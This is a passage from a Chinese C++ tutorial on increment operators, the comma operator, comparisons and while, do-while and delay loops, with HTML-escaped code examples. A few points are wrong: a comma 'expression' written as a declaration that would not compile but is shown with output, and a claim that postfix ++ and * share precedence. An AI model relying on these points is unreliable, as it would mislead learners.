(Sequence Point): 是程序执行过程中的一个时间点，在该点之前的所有副作用都已完成，并且后续的副作用尚未发生。C++ 标准定义了一些顺序点，例如： 分号 ; (语句结束处) 完整表达式结束时（如 if 条件、while 条件、for 循环的三个部分之后） 函数调用之前（所有参数的副作用完成） 某些运算符（如 &amp;&amp;, ||, , 逗号运算符）的特定位置 重要性: 在两个顺序点之间，不要对同一个变量进行多次修改，或者既修改它又读取它（除了读取它的值以计算要写入的值之外）。否则，行为是**未定义的 (Undefined Behavior)**，编译器可能产生任何结果。 示例 (未定义行为): 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int x = 5; int y; // 未定义行为: 在同一表达式中多次修改 x，且没有顺序点分隔 // y = (x++) * (x++); // 不要这样写! 结果不可预测 // y = x + (++x); // 不要这样写! 结果不可预测 // std::cout &lt;&lt; x &lt;&lt; (++x); // 不要这样写! 输出顺序和 x 的最终值不可预测 // 安全的写法: 使用顺序点分隔副作用 y = x++; // y 获取 x 的原始值 5, 然后 x 变为 6 (副作用在分号处完成) std::cout &lt;&lt; &quot;y = &quot; &lt;&lt; y &lt;&lt; &quot;, x = &quot; &lt;&lt; x &lt;&lt; std::endl; // 输出 y = 5, x = 6 y = ++x; // x 先变为 7, 然后 y 获取新值 7 (副作用在分号处完成) std::cout &lt;&lt; &quot;y = &quot; &lt;&lt; y &lt;&lt; &quot;, x = &quot; &lt;&lt; x &lt;&lt; std::endl; // 输出 y = 7, x = 7 return 0;&#125; 结论: 避免在单个表达式中对同一变量产生复杂的、依赖于副作用顺序的操作。将它们分解成多个语句通常更安全、更清晰。 5.1.7 前缀格式和后缀格式递增 (++) 和递减 (--) 运算符都有两种使用形式： 前缀 (Prefix): 运算符放在操作数之前 (++x, --x)。 行为: 先修改操作数的值（加 1 或减 1），然后使用修改后的值作为整个表达式的结果。 后缀 (Postfix): 运算符放在操作数之后 (x++, x--)。 行为: 先使用操作数的原始值作为整个表达式的结果，然后再修改操作数的值（加 1 或减 1）。 区别在于表达式的值: 表达式 行为描述 表达式的值 操作数最终值 ++x 先将 x 加 1 x 的新值 新值 x++ 先使用 x 的原始值 x 的原始值 新值 --x 先将 x 减 1 x 的新值 新值 x-- 先使用 x 的原始值 x 的原始值 新值 用法与示例: 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;int main() &#123; int a = 5, b = 5; int result_a, result_b; // 前缀递增 result_a = ++a; // a 先变成 6, 然后 result_a 被赋值为 6 std::cout &lt;&lt; &quot;Prefix: result_a = &quot; &lt;&lt; result_a &lt;&lt; &quot;, a = &quot; &lt;&lt; a &lt;&lt; std::endl; // 输出 6, 6 // 后缀递增 result_b = b++; // result_b 先被赋值为 b 的原始值 5, 然后 b 变成 6 std::cout &lt;&lt; &quot;Postfix: result_b = &quot; &lt;&lt; result_b &lt;&lt; &quot;, b = &quot; &lt;&lt; b &lt;&lt; std::endl; // 输出 5, 6 // 在 for 循环更新部分，通常前缀和后缀效果相同 // 但在复杂表达式中，它们的区别很重要 int arr[] = &#123;10, 20, 30&#125;; int index = 0; // 使用后缀获取值并移动索引 int val1 = arr[index++]; // val1 = arr[0] (10), index 变为 1 std::cout &lt;&lt; &quot;val1 = &quot; &lt;&lt; val1 &lt;&lt; &quot;, index = &quot; &lt;&lt; index &lt;&lt; std::endl; // 使用前缀移动索引并获取值 index = 0; // 重置 index int val2 = arr[++index]; // index 先变为 1, val2 = arr[1] (20) std::cout &lt;&lt; &quot;val2 = &quot; &lt;&lt; val2 &lt;&lt; &quot;, index = &quot; &lt;&lt; index &lt;&lt; std::endl; return 0;&#125; 性能建议: 对于内置类型（如 int, double, 指针），前缀和后缀的性能差异通常可以忽略。但对于用户定义的类类型（迭代器等），前缀形式 (++it) 通常比后缀形式 (it++) 效率更高，因为后缀形式需要创建一个临时对象来保存原始值。因此，在不需要使用原始值的情况下，养成优先使用前缀递增/递减的习惯是好的。 5.1.8 递增/递减运算符和指针++ 和 -- 运算符可以应用于指针，其效果是使指针指向内存中的下一个或上一个元素。编译器会自动根据指针指向的数据类型的大小来调整地址。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;int main() &#123; double arr[3] = &#123;1.1, 2.2, 3.3&#125;; double *ptr = arr; // ptr 指向 arr[0] std::cout &lt;&lt; &quot;Initial pointer: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 1.1 // 前缀递增指针 ++ptr; std::cout &lt;&lt; &quot;After ++ptr: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 2.2 // 后缀递增指针 ptr++; std::cout &lt;&lt; &quot;After ptr++: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 3.3 // 前缀递减指针 --ptr; std::cout &lt;&lt; &quot;After --ptr: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 2.2 // 后缀递减指针 ptr--; std::cout &lt;&lt; &quot;After ptr--: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 1.1 // 结合解引用 (注意优先级) ptr = arr; // 重置 double val; // *ptr++ : 获取 ptr 当前指向的值，然后 ptr 指向下一个元素 (后缀 ++ 优先级高于 *) val = *ptr++; std::cout &lt;&lt; &quot;val = *ptr++ : val = &quot; &lt;&lt; val &lt;&lt; &quot;, ptr now points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // val=1.1, ptr 指向 2.2 // *++ptr : ptr 先指向下一个元素，然后获取新指向的值 (前缀 ++ 优先级高于 *) ptr = arr; // 重置 val = *++ptr; std::cout &lt;&lt; &quot;val = *++ptr : val = &quot; &lt;&lt; val &lt;&lt; &quot;, ptr now points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // val=2.2, ptr 指向 2.2 // ++*ptr : 获取 ptr 指向的值，然后将该值加 1 (解引用 * 优先级高于前缀 ++) ptr = arr; // 重置 ++*ptr; // 将 arr[0] 的值从 1.1 增加到 2.1 std::cout &lt;&lt; &quot;After ++*ptr : arr[0] = &quot; &lt;&lt; arr[0] &lt;&lt; &quot;, ptr points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // arr[0]=2.1, ptr 指向 2.1 // (*ptr)++ : 获取 ptr 指向的值，然后将该值加 1 (括号强制先解引用) ptr = arr; // 重置 arr[0] = 1.1; // 恢复 arr[0] (*ptr)++; // 将 arr[0] 的值从 1.1 增加到 2.1 std::cout &lt;&lt; &quot;After (*ptr)++: arr[0] = &quot; &lt;&lt; arr[0] &lt;&lt; &quot;, ptr points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // arr[0]=2.1, ptr 指向 2.1 return 0;&#125; 优先级: 解引用 * 和前/后缀 ++/-- 的优先级相同，结合性是从右到左。为了清晰起见，当结合使用时，使用括号 () 是个好主意，例如 (*ptr)++。 5.1.9 组合赋值运算符C++ 提供了一组组合赋值运算符，将算术运算和赋值运算合并为一个运算符，使代码更简洁。 运算符 示例 等价于 += x += y x = x + y -= x -= y x = x - y *= x *= y x = x * y /= x /= y x = x / y %= x %= y x = x % y &amp;= x &amp;= y x = x &amp; y ` =` `x ^= x ^= y x = x ^ y &lt;&lt;= x &lt;&lt;= y x = x &lt;&lt; y &gt;&gt;= x &gt;&gt;= y x = x &gt;&gt; y 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; int score = 100; int bonus = 10; int penalty = 5; int factor = 2; score += bonus; // score = score + bonus; score 变为 110 std::cout &lt;&lt; &quot;Score after bonus: &quot; &lt;&lt; score &lt;&lt; std::endl; score -= penalty; // score = score - penalty; score 变为 105 std::cout &lt;&lt; &quot;Score after penalty: &quot; &lt;&lt; score &lt;&lt; std::endl; score *= factor; // score = score * factor; score 变为 210 std::cout &lt;&lt; &quot;Score after factor: &quot; &lt;&lt; score &lt;&lt; std::endl; score /= 3; // score = score / 3; score 变为 70 (整数除法) std::cout &lt;&lt; &quot;Score after division: &quot; &lt;&lt; score &lt;&lt; std::endl; score %= 8; // score = score % 8; score 变为 6 (70 除以 8 余 6) std::cout &lt;&lt; &quot;Score after modulo: &quot; &lt;&lt; score &lt;&lt; std::endl; // 在 for 循环更新中使用 int total = 0; for (int i = 1; i &lt;= 5; ++i) &#123; total += i; // 累加 &#125; std::cout &lt;&lt; &quot;Total (1-5): &quot; &lt;&lt; total &lt;&lt; std::endl; // 输出 15 return 0;&#125; 组合赋值运算符通常更易读，并且可能比分开写稍微高效一些。 5.1.10 复合语句（语句块）复合语句 (Compound Statement) 或 语句块 (Block) 是由一对花括号 &#123;&#125; 括起来的零条或多条语句。 作用: 语法需要: 在 C++ 语法要求只能出现一条语句的地方（例如 if, else, for, while 的循环体），可以使用语句块来包含多条语句。 创建作用域: 语句块会创建一个新的**局部作用域 (Local Scope)**。在块内声明的变量（自动存储变量）只在该块内部可见，并在块结束时销毁。 用法与示例: 12345678910111213141516171819202122#include &lt;iostream&gt;int main() &#123; int x = 10; if (x &gt; 5) &#123; // if 后面需要一条语句，这里使用语句块 std::cout &lt;&lt; &quot;x is greater than 5.&quot; &lt;&lt; std::endl; int y = x * 2; // y 只在 if 块内部可见 std::cout &lt;&lt; &quot;Double x is: &quot; &lt;&lt; y &lt;&lt; std::endl; &#125; // y 在这里销毁 // std::cout &lt;&lt; y; // 错误! y 在此作用域不可见 std::cout &lt;&lt; &quot;Loop with block:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 2; ++i) &#123; // for 循环体使用语句块 std::cout &lt;&lt; &quot; Outer loop i = &quot; &lt;&lt; i &lt;&lt; std::endl; int j = i + 10; // j 只在 for 循环的当前迭代块内可见 std::cout &lt;&lt; &quot; Inner variable j = &quot; &lt;&lt; j &lt;&lt; std::endl; &#125; // 每次迭代结束时 j 销毁 return 0;&#125; 5.1.11 其他语法技巧——逗号运算符逗号运算符 (,) 是 C++ 中优先级最低的运算符。它允许将两个表达式连接成一个表达式。 行为: 先计算逗号左侧的表达式。 丢弃左侧表达式的计算结果。 然后计算逗号右侧的表达式。 整个逗号表达式的结果是右侧表达式的值和类型。 主要用途: for 循环的初始化和更新部分: 允许在这些部分执行多个操作，而不需要语句块。 (较少见) 在需要单个表达式的地方执行多个有副作用的操作。 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; // 在 for 循环中使用逗号运算符 int i, j; std::cout &lt;&lt; &quot;Using comma in for loop:&quot; &lt;&lt; std::endl; for (i = 0, j = 10; // 初始化: 初始化 i 和 j i &lt; j; // 条件 ++i, --j) // 更新: 递增 i, 递减 j &#123; std::cout &lt;&lt; &quot;i = &quot; &lt;&lt; i &lt;&lt; &quot;, j = &quot; &lt;&lt; j &lt;&lt; std::endl; &#125; // 逗号表达式的值 int x; int result = (x = 5, x + 10); // x 先被赋值为 5, 然后计算 x+10 (15) // 整个表达式的结果是 15 std::cout &lt;&lt; &quot;Result of comma expression: &quot; &lt;&lt; result &lt;&lt; std::endl; // 输出 15 std::cout &lt;&lt; &quot;x after comma expression: &quot; &lt;&lt; x &lt;&lt; std::endl; // 输出 5 // 优先级最低 int a = 1, b = 2, c = 3; int value = a++, b += a, c += b; // 逗号优先级低于赋值 // 这实际上等价于: value = a++; (value=1, a=2) 然后计算 b+=a (b=2+2=4), 然后计算 c+=b (c=3+4=7) std::cout &lt;&lt; &quot;value=&quot; &lt;&lt; value &lt;&lt; &quot;, a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl; // 输出 value=1, a=2, b=4, c=7 // 如果想按顺序执行并取最后结果，需要括号 value = (++a, b += a, c += b); // a=3, b=4+3=7, c=7+7=14. value=14 std::cout &lt;&lt; &quot;value=&quot; &lt;&lt; value &lt;&lt; &quot;, a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl; // 输出 value=14, a=3, b=7, c=14 return 0;&#125; 虽然逗号运算符提供了这种能力，但过度使用可能降低代码的可读性。在 for 循环的初始化和更新部分是其最常见且合理的用途。 5.1.12 关系表达式关系表达式 (Relational Expression) 使用关系运算符来比较两个操作数的值，其结果是一个布尔值 (true 或 false)。 关系运算符: &lt; : 小于 (Less than) &gt; : 大于 (Greater than) &lt;=: 小于或等于 (Less than or equal to) &gt;=: 大于或等于 (Greater than or equal to) ==: 等于 (Equal to) !=: 不等于 (Not equal to) 这些运算符的优先级低于算术运算符，但高于赋值运算符。== 和 != 的优先级低于其他四个关系运算符。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int score = 85; int passing_score = 60; double temp1 = 36.5, temp2 = 37.0; bool isPassing = (score &gt;= passing_score); // 比较 score 是否大于等于 passing_score bool isFever = (temp1 &gt; temp2); // 比较 temp1 是否大于 temp2 bool isEqual = (score == 85); // 比较 score 是否等于 85 bool isNotEqual = (temp1 != temp2); // 比较 temp1 是否不等于 temp2 std::cout &lt;&lt; std::boolalpha; // 使 bool 输出为 true/false std::cout &lt;&lt; &quot;Score: &quot; &lt;&lt; score &lt;&lt; &quot;, Passing Score: &quot; &lt;&lt; passing_score &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Is passing? &quot; &lt;&lt; isPassing &lt;&lt; std::endl; // 输出 true std::cout &lt;&lt; &quot;Is fever? &quot; &lt;&lt; isFever &lt;&lt; std::endl; // 输出 false std::cout &lt;&lt; &quot;Is score 85? &quot; &lt;&lt; isEqual &lt;&lt; std::endl; // 输出 true std::cout &lt;&lt; &quot;Temps not equal? &quot; &lt;&lt; isNotEqual &lt;&lt; std::endl; // 输出 true // 在循环条件中使用 int count = 0; while (count &lt; 3) &#123; // 当 count 小于 3 时循环 std::cout &lt;&lt; &quot;Count is &quot; &lt;&lt; count &lt;&lt; std::endl; count++; &#125; return 0;&#125; 5.1.13 赋值、比较和可能犯的错误一个非常常见的 C++ 编程错误是将赋值运算符 (=) 误用在需要比较运算符 (==) 的地方，尤其是在 if 或 while 的条件语句中。 if (x = 5): 这不是比较 x 是否等于 5。它的作用是： 将 5 赋给变量 x。 整个赋值表达式 (x = 5) 的结果是赋给 x 的值，即 5。 在 if 条件中，非零值被视为 true。因此，这个 if 语句总是会执行其代码块（除非 5 被视为 false，这在 C++ 中不会发生），并且还会意外地将 x 的值修改为 5。 if (x == 5): 这才是正确的比较，检查 x 的当前值是否等于 5，结果为 true 或 false，并且不会修改 x 的值。 示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int score = 0; std::cout &lt;&lt; &quot;Enter your score: &quot;; std::cin &gt;&gt; score; // 错误: 使用了赋值 = if (score = 100) &#123; // 总是 true，并且 score 被改为 100 std::cout &lt;&lt; &quot;Mistake: You entered 100 (or maybe not, score is now 100).&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Mistake: This part will likely never execute.&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Score after mistaken if: &quot; &lt;&lt; score &lt;&lt; std::endl; // score 总是 100 // 正确: 使用了比较 == std::cout &lt;&lt; &quot;\\nEnter your score again: &quot;; std::cin &gt;&gt; score; if (score == 100) &#123; // 正确比较 std::cout &lt;&lt; &quot;Correct: Perfect score!&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Correct: Score is not 100.&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Score after correct if: &quot; &lt;&lt; score &lt;&lt; std::endl; // score 保持用户输入的值 return 0;&#125; 如何避免: 仔细检查条件语句中的 = 和 ==。 一些编码风格建议将常量放在比较运算符的左边（”Yoda conditions”），例如 if (100 == score)。这样如果意外写成 if (100 = score)，编译器会报错，因为不能给常量赋值。 5.1.14 C风格字符串的比较对于 C 风格字符串（char 数组或 char* 指针），不能直接使用关系运算符（==, !=, &lt;, &gt; 等）来比较字符串的内容。 当对两个 char* 指针使用 == 或 != 时，比较的是指针存储的内存地址，而不是它们指向的字符串内容。 要比较 C 风格字符串的内容，需要使用 C 字符串库 &lt;cstring&gt; (或 C 的 &lt;string.h&gt;) 中提供的函数，主要是 strcmp()。 strcmp(str1, str2): 如果 str1 按字典序等于 str2，返回 0。 如果 str1 小于 str2，返回负值。 如果 str1 大于 str2，返回正值。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strcmp()int main() &#123; char word1[] = &quot;apple&quot;; char word2[] = &quot;apply&quot;; char word3[] = &quot;apple&quot;; const char *p1 = &quot;banana&quot;; const char *p2 = &quot;banana&quot;; // 编译器可能将相同的字面值存储在同一地址 const char *p3 = word1; // 错误: 比较地址 if (word1 == word3) &#123; // 比较两个不同数组的地址，结果通常是 false std::cout &lt;&lt; &quot;Mistake: word1 == word3 (comparing addresses)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Mistake: word1 != word3 (comparing addresses)&quot; &lt;&lt; std::endl; &#125; if (p1 == p2) &#123; // 可能 true (如果编译器优化)，也可能 false std::cout &lt;&lt; &quot;Info: p1 == p2 (compiler might optimize literals)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Info: p1 != p2 (compiler might not optimize literals)&quot; &lt;&lt; std::endl; &#125; if (p3 == word1) &#123; // true, p3 指向 word1 的起始地址 std::cout &lt;&lt; &quot;Info: p3 == word1 (same address)&quot; &lt;&lt; std::endl; &#125; // 正确: 使用 strcmp() 比较内容 if (strcmp(word1, word3) == 0) &#123; // 比较内容是否相等 std::cout &lt;&lt; &quot;Correct: strcmp(word1, word3) == 0 (contents are equal)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Correct: strcmp(word1, word3) != 0&quot; &lt;&lt; std::endl; &#125; if (strcmp(word1, word2) &lt; 0) &#123; // 比较 word1 是否小于 word2 std::cout &lt;&lt; &quot;Correct: strcmp(word1, word2) &lt; 0 (\\&quot;apple\\&quot; &lt; \\&quot;apply\\&quot;)&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 5.1.15 比较string类字符串与 C 风格字符串不同，C++ 的 std::string 类重载了所有的关系运算符（==, !=, &lt;, &gt;, &lt;=, &gt;=）。 这意味着你可以直接使用这些运算符来比较两个 std::string 对象的内容（按字典序进行比较）。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string s1 = &quot;apple&quot;; std::string s2 = &quot;apply&quot;; std::string s3 = &quot;apple&quot;; std::string s4 = &quot;Banana&quot;; // 直接使用 == 比较内容 if (s1 == s3) &#123; std::cout &lt;&lt; &quot;s1 == s3 is true (contents are equal)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;s1 == s3 is false&quot; &lt;&lt; std::endl; &#125; // 直接使用 != if (s1 != s2) &#123; std::cout &lt;&lt; &quot;s1 != s2 is true&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;s1 != s2 is false&quot; &lt;&lt; std::endl; &#125; // 直接使用 &lt;, &gt; 等进行字典序比较 if (s1 &lt; s2) &#123; std::cout &lt;&lt; &quot;s1 &lt; s2 is true (\\&quot;apple\\&quot; &lt; \\&quot;apply\\&quot;)&quot; &lt;&lt; std::endl; &#125; if (s1 &lt; s4) &#123; // 比较 &quot;apple&quot; 和 &quot;Banana&quot; std::cout &lt;&lt; &quot;s1 &lt; s4 is true (\\&quot;apple\\&quot; &gt; \\&quot;Banana\\&quot; due to case)&quot; &lt;&lt; std::endl; // 注意：比较是区分大小写的，&#x27;a&#x27; 的 ASCII 值大于 &#x27;B&#x27; &#125; else &#123; std::cout &lt;&lt; &quot;s1 &lt; s4 is false (\\&quot;apple\\&quot; &gt; \\&quot;Banana\\&quot; due to case)&quot; &lt;&lt; std::endl; &#125; // 也可以和 C 风格字符串字面值比较 if (s1 == &quot;apple&quot;) &#123; std::cout &lt;&lt; &quot;s1 == \\&quot;apple\\&quot; is true&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 使用 std::string 进行字符串比较比使用 C 风格字符串和 strcmp() 更直观、更安全。 5.2 while循环while 循环是 C++ 中另一种重要的循环结构。与 for 循环不同，while 循环在结构上更简单，它只包含一个**测试条件 (Test Condition)**。只要该条件为 true，循环体就会一直执行。 语法: 123456789while (test_condition) &#123; // 循环体 (statement(s) to be executed repeatedly) statement1; statement2; // ...&#125;// 或者如果循环体只有一条语句while (test_condition) single_statement; 执行流程: 计算 test_condition。 如果 test_condition 为 false，跳出循环，执行循环后面的代码。 如果 test_condition 为 true，执行循环体中的语句。 回到步骤 1。 关键点: while 循环是一种**入口条件循环 (Entry-Condition Loop)**，即在每次执行循环体之前检查条件。如果第一次检查条件就为 false，则循环体一次也不会执行。 循环体内部必须有能够影响 test_condition 的语句（例如修改用于判断的变量），否则如果条件初始为 true，循环将永远不会停止，形成**无限循环 (Infinite Loop)**。 用法与示例: 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int count = 0; // 使用 while 循环打印数字 0 到 4 std::cout &lt;&lt; &quot;Counting with while (0-4):&quot; &lt;&lt; std::endl; while (count &lt; 5) &#123; // 1. 测试条件 std::cout &lt;&lt; &quot;count = &quot; &lt;&lt; count &lt;&lt; std::endl; // 2. 循环体 count++; // 3. 更新条件变量 (非常重要!) &#125; std::cout &lt;&lt; &quot;Loop finished.&quot; &lt;&lt; std::endl; // 示例：等待用户输入特定字符 char response; std::cout &lt;&lt; &quot;\\nEnter &#x27;y&#x27; to continue: &quot;; std::cin &gt;&gt; response; while (response != &#x27;y&#x27; &amp;&amp; response != &#x27;Y&#x27;) &#123; std::cout &lt;&lt; &quot;Invalid input. Please enter &#x27;y&#x27; to continue: &quot;; std::cin &gt;&gt; response; &#125; std::cout &lt;&lt; &quot;Continuing...&quot; &lt;&lt; std::endl; return 0;&#125; 5.2.1 for与whilefor 循环和 while 循环在很多情况下是可以互换的，因为它们都可以用来实现基于条件的重复执行。 转换关系: 一个典型的 for 循环： 123for (initialization; test_condition; update) &#123; body;&#125; 可以等价地转换为 while 循环： 12345initialization; // 初始化移到循环之前while (test_condition) &#123; // 测试条件保持不变 body; update; // 更新移到循环体的末尾&#125; 选择依据: for 循环: 优点: 将初始化、测试和更新逻辑集中在循环头部，结构清晰，特别适用于计数循环（循环次数已知或易于计算）或需要按固定步长迭代的情况。 适用场景: 遍历数组、按索引处理字符串、执行固定次数的操作。 while 循环: 优点: 结构更简单，只关注循环条件，适用于循环次数不确定，依赖于某个事件或状态改变的情况。 适用场景: 等待用户输入、读取文件直到结束、处理链表、当循环条件比计数器更新更重要时。 示例 (两种循环实现相同功能): 123456789101112131415161718192021#include &lt;iostream&gt;int main() &#123; // 使用 for 循环计算 1 到 5 的和 int sum_for = 0; for (int i = 1; i &lt;= 5; ++i) &#123; sum_for += i; &#125; std::cout &lt;&lt; &quot;Sum using for: &quot; &lt;&lt; sum_for &lt;&lt; std::endl; // 使用 while 循环计算 1 到 5 的和 int sum_while = 0; int i_while = 1; // 初始化 while (i_while &lt;= 5) &#123; // 测试条件 sum_while += i_while; i_while++; // 更新 &#125; std::cout &lt;&lt; &quot;Sum using while: &quot; &lt;&lt; sum_while &lt;&lt; std::endl; return 0;&#125; 虽然两者可以转换，但选择更自然地表达循环意图的结构可以提高代码的可读性。 5.2.2 等待一段时间：编写延时循环有时我们需要让程序暂停执行一段时间。虽然有更精确、更现代的方法（如 C++11 &lt;chrono&gt; 和 &lt;thread&gt; 库），但可以使用循环来实现简单的、基于处理器时间的**延时循环 (Delay Loop)**。 这种方法不精确且不推荐用于实际的精确延时，因为它： 依赖于处理器速度: 在快的 CPU 上执行时间短，在慢的 CPU 上执行时间长。 受编译器优化影响: 编译器可能会识别出循环体为空或无副作用，并将其完全优化掉。 浪费 CPU 资源: 循环在空转，消耗 CPU 时间，无法执行其他有用任务。 基本思路: 执行一个已知需要一定时间的空循环或简单操作的循环。 示例 (使用 &lt;ctime&gt; 库): &lt;ctime&gt; (或 C 的 &lt;time.h&gt;) 库提供了一些与时间相关的函数，可以用来实现稍微好一点（但仍不理想）的延时。 clock(): 返回程序启动以来所用的时钟计时单元 (clock ticks) 数。 CLOCKS_PER_SEC: 一个常量，表示每秒包含的时钟计时单元数。 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;ctime&gt; // 为了 clock() 和 CLOCKS_PER_SECint main() &#123; std::cout &lt;&lt; &quot;Starting delay...&quot; &lt;&lt; std::endl; float delay_seconds = 2.5f; // 期望延时 2.5 秒 // 获取开始时间 clock_t start_time = clock(); // 计算目标结束时间 (以 clock ticks 为单位) clock_t target_ticks = delay_seconds * CLOCKS_PER_SEC; // 循环直到经过了足够多的 clock ticks while (clock() &lt; start_time + target_ticks) &#123; // 循环体可以为空，或者执行一些轻量操作 // ; // 空语句 &#125; std::cout &lt;&lt; &quot;Delay finished after approximately &quot; &lt;&lt; delay_seconds &lt;&lt; &quot; seconds.&quot; &lt;&lt; std::endl; // 另一个简单的空循环延时 (非常不精确) // long wait = 0; // while (wait &lt; 100000000) &#123; // 循环次数需要根据机器调整 // wait++; // &#125; // std::cout &lt;&lt; &quot;Simple loop delay finished.&quot; &lt;&lt; std::endl; return 0;&#125; 再次强调: 对于需要精确延时或暂停执行而不浪费 CPU 的场景，应使用 C++11 及更高版本提供的 &lt;chrono&gt; 和 &lt;thread&gt; 中的 std::this_thread::sleep_for() 或 std::this_thread::sleep_until()。 1234567891011121314151617#include &lt;iostream&gt;#include &lt;chrono&gt; // 为了时间单位 (e.g., seconds, milliseconds)#include &lt;thread&gt; // 为了 std::this_thread::sleep_forint main() &#123; std::cout &lt;&lt; &quot;Starting modern delay...&quot; &lt;&lt; std::endl; // 延时 2 秒 500 毫秒 std::chrono::seconds sec(2); std::chrono::milliseconds ms(500); std::this_thread::sleep_for(sec + ms); // 线程休眠，不消耗 CPU std::cout &lt;&lt; &quot;Modern delay finished.&quot; &lt;&lt; std::endl; return 0;&#125; 这个现代方法更精确、可移植性更好，并且不会浪费 CPU 周期。 5.3 do while循环do while 循环是 C++ 提供的第三种循环结构。它与 while 循环非常相似，但有一个关键区别：do while 循环是**出口条件循环 (Exit-Condition Loop)**，而 while 循环是入口条件循环。 这意味着 do while 循环会先执行一次循环体，然后再检查测试条件。只要条件为 true，循环就会继续执行。 语法: 123456do &#123; // 循环体 (statement(s) to be executed repeatedly) statement1; statement2; // ...&#125; while (test_condition); // 注意这里的条件后面必须有分号 ; 或者如果循环体只有一条语句（虽然不常见，且为了清晰通常还是用花括号）： 123do single_statement;while (test_condition); 执行流程: 执行循环体中的语句。 计算 test_condition。 如果 test_condition 为 true，回到步骤 1。 如果 test_condition 为 false，循环终止，执行循环后面的代码。 关键点: 至少执行一次: 由于条件是在循环体执行之后检查的，do while 循环的循环体至少会执行一次，即使条件初始就为 false。 分号: while (test_condition) 后面必须有一个分号 ;。 适用场景: 当你需要确保循环体中的代码至少执行一次时，do while 循环是理想的选择。例如，获取用户输入并验证，至少需要获取一次输入才能进行验证。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;int main() &#123; int number; // 示例：要求用户输入一个正数 // 循环体至少执行一次以获取输入 do &#123; std::cout &lt;&lt; &quot;Enter a positive number: &quot;; std::cin &gt;&gt; number; if (number &lt;= 0) &#123; std::cout &lt;&lt; &quot;Invalid input. Please try again.&quot; &lt;&lt; std::endl; &#125; &#125; while (number &lt;= 0); // 条件在输入之后检查 std::cout &lt;&lt; &quot;You entered the positive number: &quot; &lt;&lt; number &lt;&lt; std::endl; // 比较: 如果使用 while，需要先获取一次输入 // int number_while; // std::cout &lt;&lt; &quot;\\nEnter a positive number (using while): &quot;; // std::cin &gt;&gt; number_while; // while (number_while &lt;= 0) &#123; // std::cout &lt;&lt; &quot;Invalid input. Please try again.&quot; &lt;&lt; std::endl; // std::cout &lt;&lt; &quot;Enter a positive number (using while): &quot;; // std::cin &gt;&gt; number_while; // &#125; // std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; number_while &lt;&lt; std::endl; // 即使条件初始为 false，循环体也执行一次 int count = 5; std::cout &lt;&lt; &quot;\\nStarting do-while with count = 5 (condition count &lt; 5 is false):&quot; &lt;&lt; std::endl; do &#123; std::cout &lt;&lt; &quot; Inside do-while loop, count = &quot; &lt;&lt; count &lt;&lt; std::endl; // 这行会执行 count++; &#125; while (count &lt; 5); // 第一次检查时 count 是 6, 条件为 false std::cout &lt;&lt; &quot;After do-while loop, count = &quot; &lt;&lt; count &lt;&lt; std::endl; // count 变为 6 return 0;&#125; 与 while 和 for 的比较: while: 入口条件，可能一次都不执行。 for: 通常用于计数或已知迭代次数，结构包含初始化、条件、更新。 do while: 出口条件，保证至少执行一次。 根据循环逻辑选择最合适的循环结构可以使代码更清晰、更易于理解。如果需要确保操作至少发生一次（如菜单选择、输入验证），do while 是一个很好的选择。 5.4 基于范围的for循环（C++11）C++11 引入了一种更简洁、更易读的 for 循环语法，称为基于范围的 for 循环 (Range-Based for Loop) 或 增强 for 循环 (Enhanced for Loop)**。它专门用于遍历一个序列（或范围）中的所有元素**，例如数组、STL 容器（如 vector, array, string）、初始化列表等。 目的: 简化遍历操作，减少手动管理索引或迭代器的代码，避免常见的差一错误 